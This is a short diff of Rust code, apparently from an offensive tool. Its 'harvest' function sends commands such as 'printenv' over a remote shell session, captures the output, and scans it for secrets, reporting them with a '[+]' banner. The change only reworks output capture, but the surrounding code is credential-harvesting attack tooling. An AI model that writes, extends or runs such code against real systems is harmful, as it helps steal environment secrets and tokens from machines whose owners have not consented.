@@ -179,12 +179,12 @@ pub fn harvest(
         "printenv 2>/dev/null",
         "cat /proc/cpuinfo 2>/dev/null | head -20",
     ];
-    let start = s.log.len();
+    s.start_capture();
     for c in cmds {
         s.send_line(c)?;
         s.collect(Duration::from_secs(2));
     }
-    let text = String::from_utf8_lossy(&s.log[start..]).into_owned();
+    let text = String::from_utf8_lossy(&s.log).into_owned();
     let secrets = extract_secrets(&text);
 
     println!("\n{} {} potential secret(s):", "[+]".bold().green(), secrets.len());
